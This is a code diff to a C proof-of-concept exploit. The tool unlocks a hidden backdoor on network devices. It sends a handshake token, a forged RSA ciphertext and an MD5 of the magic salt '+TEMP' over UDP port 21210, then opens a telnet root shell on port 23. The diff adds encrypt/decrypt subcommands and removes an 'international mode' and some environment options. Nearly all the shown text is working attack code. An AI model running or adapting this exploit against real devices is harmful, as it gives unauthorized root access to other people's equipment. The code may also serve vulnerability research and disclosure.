@@ -14,8 +14,6 @@
 
 #define SCAN_DELAY  300000
 #define STAGE_DELAY 100000
-#define DELAY_INCREMENT 10000
-#define DELAY_DECREMENT 1000
 #define BACKDOOR_PORT 21210
 #define TELNET_PORT 23
 #define PLAINTEXT_LENGTH 0x20
@@ -245,13 +243,7 @@ int communicate(char *ip_addr,
   server_addr.sin_addr.s_addr = inet_addr(ip_addr);
   server_addr.sin_port = htons(port);
   
-/*
-int envelope_len = 0x80;
-  unsigned char envelope[envelope_len];
-  memset(envelope, 0, envelope_len);
-  memcpy(envelope, msg, msg_len);
-  */
-  printf("[>] Sending 0x%x-byte message to %s on UDP port %d:\n", msg_len, ip_addr, port);
+  printf("[>] Sending message to %s on UDP port %d:\n", ip_addr, port);
   hexdump(msg, msg_len);
 
   sendto(sockfd, (const char*) msg, msg_len, NO_FLAGS, 
@@ -264,7 +256,7 @@ int envelope_len = 0x80;
   if (resp_len > 0) {
     printf("[-] Expecting %d bytes in reply...\n", resp_len);
     printf("[-] Setting socket timeout to %lds + %ldus\n", tv.tv_sec, tv.tv_usec);
-    setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+    //setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
     
     // Here we might want to read from the socket in chunks, without
     // blocking indefinitely...
@@ -289,16 +281,6 @@ int check_tcp_port(char *ip_addr, int port) {
   int sockfd;
 
   printf("[>] Checking TCP port %d on %s...\n", port, ip_addr);
-
-  /* KLUDGE 
-  char *telnet_command;
-  telnet_command = malloc(0x80 * sizeof(char));
-  sprintf(telnet_command, "telnet %s %d", ip_addr, port);
-  printf("[>] Using system(\"%s\") as a kludge...\n", telnet_command);
-  return !system(telnet_command);
-
-  */
-
   sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
   if(sockfd == -1){
     puts("[x] Failed to create socket. Fatal.");
@@ -388,19 +370,6 @@ struct DeviceList * lookup_device_hash(struct DeviceList *DL, unsigned char *has
   return NULL;
 }
 
-struct DeviceList * lookup_device_name(struct DeviceList *DL, char *name) {
-  struct DeviceList *node;
-  for (node = DL; node != NULL; node = node->next) {
-    if (!strcmp(name, node->identifier)) {
-      printf("[+] Found matching name: %s\n", node->identifier);
-      return node;
-    }
-  }
-  return NULL;
-}
-
-
-#define FALLBACK "international 33 (no id)"
 
 struct DeviceList * init_device_list() {
   struct DeviceList *DL;
@@ -421,14 +390,6 @@ struct DeviceList * init_device_list() {
     "070BCE199B043C24B03BCEB970D7E47EEBA7F59D2BE4764DD8F06DB8E0E2945C912F52CB31C56C83"
     "49B689198C4A0D88FD029CCECDDFF9C1491FFB7893C11FAD69987DBA15FF11C7F1D570963FA3825B"
     "6AE92815388B3E03",
-    "010001");
-
-  add_entry_to_device_list(DL,
-    "international 33 (no id)",
-    "CC232B9BB06C49EA1BDD0DE1EF9926872B3B16694AC677C8C581E1B4F59128912CBB92EB363990FA"
-    "E43569778B58FA170FB1EBF3D1E88B7F6BA3DC47E59CF5F3C3064F62E504A12C5240FB85BE727316"
-    "C10EFF23CB2DCE973376D0CB6158C72F6529A9012786000D820443CA44F9F445ED4ED0344AC2B1F6"
-    "CC124D9ED309A519",
     "010001");
 
 
@@ -506,10 +467,6 @@ struct DeviceList * probe_udp_port(struct DeviceList *DL,
 
 #define PHONY_CIPHERTEXT_LENGTH 0x80
 
-
-// What if we add this constraint: the phony ciphertext should begin
-// with the ephemeral password?
-// That way it won't really matter if we fall out of sync!
 void random_buffer(unsigned char *buf, int len) {
   FILE *urandom;
   urandom = fopen("/dev/urandom", "rb");
@@ -518,23 +475,16 @@ void random_buffer(unsigned char *buf, int len) {
   return;
 }
 
-unsigned char *find_phony_ciphertext(RSA *rsa,
-  unsigned char *prefix,
-  int prefix_len) {
+unsigned char *find_phony_ciphertext(RSA *rsa) {
   unsigned char *phony_ciphertext;
   unsigned char phony_plaintext[1024];
   int plaintext_length;
-  int tries = 0;
   memset(phony_plaintext, 0, 0x20);
   phony_ciphertext = calloc(PHONY_CIPHERTEXT_LENGTH, sizeof(char));
   do {
-    tries++;
 
     random_buffer(phony_ciphertext, PHONY_CIPHERTEXT_LENGTH);
     phony_ciphertext[0] || (phony_ciphertext[0] |= 1);
-    if (prefix_len) {
-      memcpy(phony_ciphertext, prefix, prefix_len);
-    }
 
     if (rsa == NULL) {
       // If we don't have the public key, we can still try just
@@ -558,7 +508,7 @@ unsigned char *find_phony_ciphertext(RSA *rsa,
     if ((plaintext_length < 0x101) && 
         (0x21 <= phony_plaintext[0]) && 
         (phony_plaintext[0] < 0x7f)) {
-      printf("[!] Found valid Stage II payload in %d attempts:\n", tries);
+      printf("[!] Found stage 2 payload:\n");
       hexdump(phony_ciphertext, PHONY_CIPHERTEXT_LENGTH);
       printf("[=] Decrypts to (%d bytes):\n", plaintext_length);
       hexdump(phony_plaintext, plaintext_length);
@@ -587,25 +537,37 @@ int main(int argc, char **argv) {
     exit(0);
   }
 
+  if (!(strcmp(argv[1], "enc"))) {
+    rsa = init_rsa(K2G_HARDCODED_n, K2G_HARDCODED_e);
+    fread(plaintext, sizeof(char), PLAINTEXT_LENGTH, stdin);
+    fflush(stdin);
+    fprintf(stderr, "[+] Read data:\n");
+    fhexdump(stderr, plaintext, PLAINTEXT_LENGTH);
+    fprintf(stderr, "[+] Encrypting plaintext '%s' of length %ld\n", plaintext, 
+        strlen((char *) plaintext));
+    encrypt_with_pubkey(rsa, plaintext, ciphertext);
+    hexdump(ciphertext, CIPHERTEXT_LENGTH);
+    exit(0);
+  } else if (!(strcmp(argv[1], "dec"))) {
+    rsa = init_rsa(K2G_HARDCODED_n, K2G_HARDCODED_e);
+    fread(ciphertext, sizeof(char), CIPHERTEXT_LENGTH, stdin);
+    fprintf(stderr, "[+] Read data:\n");
+    fhexdump(stderr, ciphertext, CIPHERTEXT_LENGTH);
+    fprintf(stderr, "[+] Decrypting with public key...\n");
+    decrypt_with_pubkey(rsa, ciphertext, plaintext);
+    hexdump(plaintext, PLAINTEXT_LENGTH);
+    fprintf(stderr, "[+] strlen(decrypt_with_pubkey(payload)) = %ld\n", strlen((char *) plaintext)); 
+    exit(0);
+  }
+     
+
   /** The exploit **/
 
   char *ip_addr = argv[1]; 
   const char *handshake_token = "ABCDEF1234";
   unsigned char *phony_ciphertext;
   unsigned char backdoor_key[16];
-  char magic_salt[6]; // = "+TEMP";
-  char *salt_var;
-  salt_var = getenv("BACKDOOR_SALT");
-  if (salt_var == NULL) {
-    salt_var = "TEMP";
-  }
-  snprintf(magic_salt, 6, "+%s", salt_var);
-  printf("[+] Using magic salt \"%s\"\n", magic_salt);
-  int temp_mode;
-  temp_mode = strcmp(magic_salt, "+TEMP") == 0;
-  printf("[+] temp_mode = %d\n", temp_mode);
-  int international_mode;
-  international_mode = getenv("BACKDOOR_INTERNATIONAL") != NULL;
+  const char *magic_salt = "+TEMP";
   unsigned char buffer[CIPHERTEXT_LENGTH];
   int tries = MAX_TRIES;
   char *telnet_command;
@@ -667,14 +629,10 @@ int main(int argc, char **argv) {
   }
 
 
-  char *telnet_port_str;
-  telnet_port_str = getenv("BACKDOOR_TELNET_PORT");
-  int telnet_port = telnet_port_str ? atoi(telnet_port_str) : 23;
-
   telnet_command = malloc(0x80 * sizeof(char));
-  sprintf(telnet_command, "telnet %s %d", ip_addr, telnet_port);
+  sprintf(telnet_command, "telnet %s 23", ip_addr);
   
-  if (temp_mode && check_tcp_port(ip_addr, telnet_port)) {
+  if (check_tcp_port(ip_addr, TELNET_PORT)) {
     printf("[!] The back door is already open! Why not killall telnetd and try again?\n");
     system(telnet_command);
     printf("[*] Have a nice day.\n");
@@ -721,67 +679,30 @@ int main(int argc, char **argv) {
   }
 
 
-  int no_reply = 0;
-  int got_reply = 0;
-  float ratio = 0.0;
 
 #define QUALITY_CONTROL(__com_res) { if ((__com_res) == -1) { \
-  no_reply ++; \
-  ratio = 100 * no_reply / (no_reply + got_reply); \
-  printf("[x] No reply (this has happened %d times out of %d (%.2f%%)).\n", no_reply, no_reply + got_reply, ratio); \
-  stage_delay += DELAY_INCREMENT; \
-  goto STAGE_I;  \
-} else if (stage_delay > DELAY_DECREMENT) { \
-  got_reply ++; \
-  stage_delay -= DELAY_DECREMENT; \
+  printf("[x] What we have here is a failure to communicate.\n"); \
+  stage_delay += 1000; \
+  /* goto STAGE_I; */ \
+} else if (stage_delay > 100) { \
+  stage_delay -= 100; \
 } }
 
   /* something should be done here to reset the state machine */
   int on_try = 0;
   int com_res = 0;
-
-  if (international_mode) {
-    device_info = lookup_device_name(device_list, FALLBACK);
-    printf("[+] Setting RSA key for international mode\n");
-    rsa = init_rsa((char *) device_info->public_n, device_info->public_e);
-  }
-
-// we only need to define this once, since it's constant
-//
-  int backdoor_key_len = 0x10;
-  memset(backdoor_key, 0, backdoor_key_len);
-  md5raw(backdoor_key, (unsigned char *) magic_salt, strlen(magic_salt));
-
   do {
     
     goto STAGE_I;
 
 STAGE_I:
     on_try += 1;
-
-    if (temp_mode && check_tcp_port(ip_addr, telnet_port)) {
-
-      gettimeofday(&timecheck, NULL);
-      elapsed = ((long)timecheck.tv_sec * 1000 + (long)timecheck.tv_usec / 1000) - start;
-
-      printf("[*] Backdoor lock picked in %ld msec with %d attempts.\n", elapsed, on_try);
-      printf("[*] Please enjoy your root shell.\n");
-      system(telnet_command);
-      printf("[*] PoC complete. Have a nice day.\n");
-      exit(0);
-    } else {
-      printf("[+] Not yet. %d tries remaining...\n", tries-on_try);
-    }
-
-    if (international_mode) {
-      goto STAGE_II;
-    }
     usleep(stage_delay);
     memset(buffer, 0, 0x80);
     bar('=');
     printf("[*] ENTERING STAGE I (round %d/%d) (delay = %d)%s\n", on_try, tries,
         stage_delay,
-        international_mode ? " IN INTERNATIONAL MODE" : "");
+        CHAOS_MODE ? " IN CHAOS MODE" : "");
     bar('=');
     printf("[+] Sending handshake token: %s\n", handshake_token);
     printf("[-] Waiting for device identifying hash...\n");
@@ -795,15 +716,12 @@ STAGE_I:
     printf("[+] Received device identifying hash:\n");
     hexdump(buffer, 16);
 
-    if (!international_mode) {
+    if (!CHAOS_MODE) {
       if (device_info == NULL) {
         if ((device_info = lookup_device_hash(device_list, buffer))) {
           rsa = init_rsa((char *) device_info->public_n, device_info->public_e);
         } else {
-          //CHAOS_MODE = 1;
-          international_mode = 1;
-          device_info = lookup_device_name(device_list, FALLBACK);
-          rsa = init_rsa((char *) device_info->public_n, device_info->public_e);
+          CHAOS_MODE = 1;
         }
       } else {
         // not strictly necessary, but I like to make sure everything's in order
@@ -814,7 +732,7 @@ STAGE_I:
             exit(1);
           }
         } else {
-          printf("[+] Device identifying hash matches MD5(\"%s\").\n", device_info->identifier);
+          printf("[+] Device identifying hash matches expected value.\n");
         }
       }
     } else {
@@ -829,10 +747,10 @@ STAGE_II:
     bar('=');
     printf("[*] ENTERING STAGE II (round %d/%d) (delay = %d)%s\n", on_try, tries,
         stage_delay,
-        international_mode ? " IN INTERNATIONAL MODE" : "");
+        CHAOS_MODE ? " IN CHAOS MODE" : "");
     bar('=');
     memset(buffer, 0, CIPHERTEXT_LENGTH);
-    phony_ciphertext = find_phony_ciphertext(rsa, backdoor_key, backdoor_key_len);  
+    phony_ciphertext = find_phony_ciphertext(rsa);  
     // This blocks and waits too long in CHAOS_MODE
     com_res = communicate(ip_addr, backdoor_port,
         phony_ciphertext,
@@ -851,14 +769,15 @@ STAGE_III:
     bar('=');
     printf("[*] ENTERING STAGE III (round %d/%d) (delay = %d)%s\n", on_try, tries, 
         stage_delay,
-        international_mode ? " IN INTERNATIONAL MODE" : "");
+        CHAOS_MODE ? " IN CHAOS MODE" : "");
     bar('=');
+    memset(backdoor_key, 0, 0x10);
     printf("[+] Sending MD5('%s') and hoping for collision...\n",
         (char *) magic_salt);
-
+    md5raw(backdoor_key, (unsigned char *) magic_salt, strlen(magic_salt));
     com_res = communicate(ip_addr, backdoor_port,
         backdoor_key,
-        backdoor_key_len,
+        0x10,
         buffer,
         0,
         stage_delay);
@@ -867,6 +786,19 @@ STAGE_III:
     /* Now test to see if the telnet port is open. */
 
     usleep(stage_delay);
+    if (check_tcp_port(ip_addr, TELNET_PORT)) {
+
+      gettimeofday(&timecheck, NULL);
+      elapsed = ((long)timecheck.tv_sec * 1000 + (long)timecheck.tv_usec / 1000) - start;
+
+      printf("[*] Backdoor lock picked in %ld msec with %d attempts.\n", elapsed, on_try);
+      printf("[*] Please enjoy your root shell.\n");
+      system(telnet_command);
+      printf("[*] PoC complete. Have a nice day.\n");
+      exit(0);
+    } else {
+      printf("[+] Not yet. %d tries remaining...\n", tries-on_try);
+    }
 
   } while (tries - on_try > 0);
   
